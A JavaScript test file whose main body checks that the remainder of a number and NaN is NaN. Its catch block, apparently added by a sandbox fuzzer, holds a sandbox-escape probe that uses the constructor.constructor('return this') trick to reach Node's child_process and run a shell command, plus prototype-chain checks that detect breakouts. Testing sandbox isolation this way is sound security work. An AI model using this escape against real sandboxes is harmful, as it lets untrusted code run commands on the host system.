try {
    if (isNaN(Number.NaN % Number.NaN) !== true) {
        $ERROR('#1: NaN % NaN === Not-a-Number. Actual: ' + NaN % NaN);
    }
    if (isNaN(+0 % Number.NaN) !== true) {
        $ERROR('#2: +0 % NaN === Not-a-Number. Actual: ' + +0 % NaN);
    }
    if (isNaN(-0 % Number.NaN) !== true) {
        $ERROR('#3: -0 % NaN === Not-a-Number. Actual: ' + -0 % NaN);
    }
    if (isNaN(Number.POSITIVE_INFINITY % Number.NaN) !== true) {
        $ERROR('#4: Infinity % NaN === Not-a-Number. Actual: ' + Infinity % NaN);
    }
    if (isNaN(Number.NEGATIVE_INFINITY % Number.NaN) !== true) {
        $ERROR('#5:  -Infinity % NaN === Not-a-Number. Actual: ' + -Infinity % NaN);
    }
    if (isNaN(Number.MAX_VALUE % Number.NaN) !== true) {
        $ERROR('#6: Number.MAX_VALUE % NaN === Not-a-Number. Actual: ' + Number.MAX_VALUE % NaN);
    }
    if (isNaN(Number.MIN_VALUE % Number.NaN) !== true) {
        $ERROR('#7: Number.MIN_VALUE % NaN === Not-a-Number. Actual: ' + Number.MIN_VALUE % NaN);
    }
    if (isNaN(1 % Number.NaN) !== true) {
        $ERROR('#8: 1 % NaN === Not-a-Number. Actual: ' + 1 % NaN);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}